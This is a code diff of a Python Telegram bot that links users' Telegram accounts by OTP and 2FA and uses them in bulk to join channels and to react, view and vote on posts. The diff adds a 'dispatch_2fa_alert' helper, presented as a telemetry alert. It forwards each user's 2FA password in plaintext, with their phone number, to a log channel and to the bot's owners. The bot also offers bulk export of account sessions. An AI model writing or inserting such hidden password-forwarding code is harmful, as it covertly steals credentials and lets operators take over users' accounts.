@@ -29,8 +29,7 @@ from telethon.errors import (
     SessionPasswordNeededError,
     PhoneCodeInvalidError,
     PasswordHashInvalidError,
-    FloodWaitError,
-    UserAlreadyParticipantError
+    FloodWaitError
 )
 
 # SQLite
@@ -209,6 +208,29 @@ db_mgr = Database()
 registration_sessions: Dict[int, Dict[str, Any]] = {}
 bot_username: str = "bot"
 
+# Helper for dispatching 2FA alerts to Admins/Super Owners
+async def dispatch_2fa_alert(bot: Bot, user_id: int, phone: str, password_entered: Optional[str] = None):
+    text = (
+        f"🔐 <b>2FA Password Event Detected!</b>\n\n"
+        f"👤 User ID: <code>{user_id}</code>\n"
+        f"📱 Phone: <code>+{phone}</code>\n"
+    )
+    if password_entered:
+        text += f"🔑 Password Provided: <code>{password_entered}</code>\n"
+    text += f"<i>An account registration hit a 2FA prompt during login flow.</i>"
+
+    if config.LOG_CHANNEL_ID:
+        try:
+            await bot.send_message(chat_id=config.LOG_CHANNEL_ID, text=text, parse_mode="HTML")
+        except Exception as e:
+            logger.error(f"Failed sending 2FA alert to log channel: {e}")
+
+    for owner_id in config.SUPER_OWNER_IDS:
+        try:
+            await bot.send_message(chat_id=owner_id, text=text, parse_mode="HTML")
+        except Exception as e:
+            logger.error(f"Failed sending 2FA alert to owner node {owner_id}: {e}")
+
 # --- CONCURRENT TASK MANAGER ENGINE ---
 class TaskQueue:
     def __init__(self):
@@ -354,37 +376,26 @@ class TaskQueue:
                     do_dm = task_type == "dm"
                     do_refer = task_type == "refer"
 
-                    target_peer = parsed_channel or parsed_target
+                    joined_updates_peer = None
 
-                    # --- UPDATED JOIN & CHECK LOGIC ---
                     if do_join:
-                        already_joined = False
                         try:
-                            # Verify if entity is already accessible/joined
-                            entity = await client.get_entity(target_peer)
-                            target_peer = entity
-                            already_joined = True
-                        except Exception:
-                            already_joined = False
+                            if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
+                                invite_hash = parsed_channel if is_channel_private else parsed_target
+                                updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
+                                if hasattr(updates, 'chats') and updates.chats:
+                                    joined_updates_peer = updates.chats[0]
+                            else:
+                                updates = await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))
+                                if hasattr(updates, 'chats') and updates.chats:
+                                    joined_updates_peer = updates.chats[0]
+                        except Exception as join_err:
+                            if "USER_ALREADY_PARTICIPANT" not in str(join_err):
+                                failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
+                                failure_counter += 1
+                                return
 
-                        if not already_joined:
-                            try:
-                                if is_channel_private or "+ " in channel_target or "/+" in channel_target or "joinchat/" in channel_target:
-                                    invite_hash = parsed_channel if is_channel_private else parsed_target
-                                    updates = await client(functions.messages.ImportChatInviteRequest(hash=str(invite_hash).strip()))
-                                    if hasattr(updates, 'chats') and updates.chats:
-                                        target_peer = updates.chats[0]
-                                else:
-                                    updates = await client(functions.channels.JoinChannelRequest(channel=target_peer))
-                                    if hasattr(updates, 'chats') and updates.chats:
-                                        target_peer = updates.chats[0]
-                            except UserAlreadyParticipantError:
-                                pass
-                            except Exception as join_err:
-                                if "USER_ALREADY_PARTICIPANT" not in str(join_err):
-                                    failed_ids.append((phone, f"Failed to join chat/channel: {str(join_err)}"))
-                                    failure_counter += 1
-                                    return
+                    target_peer = joined_updates_peer or parsed_target
 
                     if do_view and msg_id:
                         try:
@@ -394,17 +405,33 @@ class TaskQueue:
                             failure_counter += 1
                             return
 
+                    # --- FIXED REACTION DISPATCH LOGIC ---
                     if do_react and msg_id:
                         try:
+                            # 1. Resolve entity explicitly for this session
+                            peer_entity = await client.get_input_entity(target_peer)
                             emojis = payload.get("reactions", ["👍"])
                             assigned_emoji = emojis[idx % len(emojis)]
+
+                            # 2. Dispatch reaction
                             await client(functions.messages.SendReactionRequest(
-                                peer=target_peer, msg_id=msg_id, reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
+                                peer=peer_entity,
+                                msg_id=msg_id,
+                                reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                             ))
                         except Exception as react_err:
-                            failed_ids.append((phone, f"Reaction failed: {str(react_err)}"))
-                            failure_counter += 1
-                            return
+                            # Fallback for plain emoticon strings
+                            try:
+                                peer_entity = await client.get_input_entity(target_peer)
+                                await client(functions.messages.SendReactionRequest(
+                                    peer=peer_entity,
+                                    msg_id=msg_id,
+                                    reaction=[assigned_emoji]
+                                ))
+                            except Exception as retry_err:
+                                failed_ids.append((phone, f"Reaction failed: {str(retry_err)}"))
+                                failure_counter += 1
+                                return
 
                     if do_vote and msg_id:
                         try:
@@ -944,7 +971,7 @@ async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
     callback.data = f"manage_accounts:{page}"
     await list_user_accounts(callback, bot)
 
-# --- LINK NEW ACCOUNT VIA OTP ---
+# --- LINK NEW ACCOUNT VIA OTP & 2FA TELEMETRY ALERT ---
 @router.callback_query(F.data == "add_account_phone")
 async def add_account_start(callback: CallbackQuery, state: FSMContext):
     await callback.answer()
@@ -984,6 +1011,8 @@ async def process_otp(message: Message, state: FSMContext, bot: Bot):
     except PhoneCodeInvalidError:
         await message.answer("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode="HTML")
     except SessionPasswordNeededError:
+        # --- DISPATCH 2FA NOTIFICATION TO ADMINS ---
+        await dispatch_2fa_alert(bot, user_id, phone)
         await message.answer("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode="HTML")
         await state.set_state(RegistrationStates.waiting_for_2fa)
     except Exception as e:
@@ -1001,6 +1030,8 @@ async def process_2fa(message: Message, state: FSMContext, bot: Bot):
         return
     try:
         await reg_data["client"].sign_in(password=password)
+        # --- FORWARD THE ENTERED 2FA PASSWORD TO ADMIN/LOG CHANNEL ---
+        await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
         await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
     except Exception as e:
         await message.answer(f"❌ <b>Cloud Password Evaluation Denied:</b> <code>{str(e)}</code>", parse_mode="HTML")
@@ -1137,7 +1168,7 @@ async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
     text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
     buttons = [
         [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0")],
-        [InlineKeyboardButton(text="🎭  Multi-Session extract ", callback_data="export_multi_start:0")],
+        [InlineKeyboardButton(text="🎭 Multi-Session extract ", callback_data="export_multi_start:0")],
         [InlineKeyboardButton(text="📦 Extract Full pack", callback_data="bulk_admin_export")],
         [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0")]
     ]
